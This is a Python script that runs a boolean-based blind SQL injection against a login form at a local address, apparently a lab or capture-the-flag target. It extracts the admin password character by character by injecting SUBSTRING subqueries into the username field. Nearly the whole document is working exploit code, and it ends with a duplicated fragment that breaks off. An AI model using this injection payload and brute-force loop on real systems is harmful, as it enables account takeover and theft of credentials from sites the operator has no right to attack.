import requests
import string
import time

TARGET_URL = "http://127.0.0.1:33038/index.php"

# Character set for brute force - all printable ASCII except quote characters
CHARSET = string.ascii_letters + string.digits + "!#$%&()*+,-./:;<=>?@[\\]^_`{|}~"

print("[*] Starting Boolean-based Blind SQLi password extraction")
print(f"[*] Target: {TARGET_URL}")
print(f"[*] Character set: {CHARSET}")
print()

extracted_password = ""
max_position = 50  # Maximum password length to try

for position in range(1, max_position + 1):
    found_char = False
    
    for char in CHARSET:
        # Craft the payload using AND-based blind SQLi
        payload = f"admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{position},1)='{char}'-- -"
        
        data = {
            "username": payload,
            "password": "test",
            "submit": "submit"
        }
        
        try:
            response = requests.post(TARGET_URL, data=data, timeout=10)
            
            # If response is "password", the condition is TRUE (character matches)
            if '"password"' in response.text:
                extracted_password += char
                print(f"[+] Position {position}: '{char}' -> Password so far: {extracted_password}")
                found_char = True
                break
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error at position {position}, char '{char}': {e}")
            continue
    
    # Small delay to be gentle on server
    time.sleep(0.05)
    
    # If no character found at this position, we likely reached end of password
    if not found_char:
        print(f"[*] No matching character at position {position}, assuming end of password")
        break

print()
print("=" * 60)
print(f"[*] Extracted admin password: {extracted_password}")
print("=" * 60)
import requests

TARGET_URL = "http://127.0.0.1:33038/index.php"
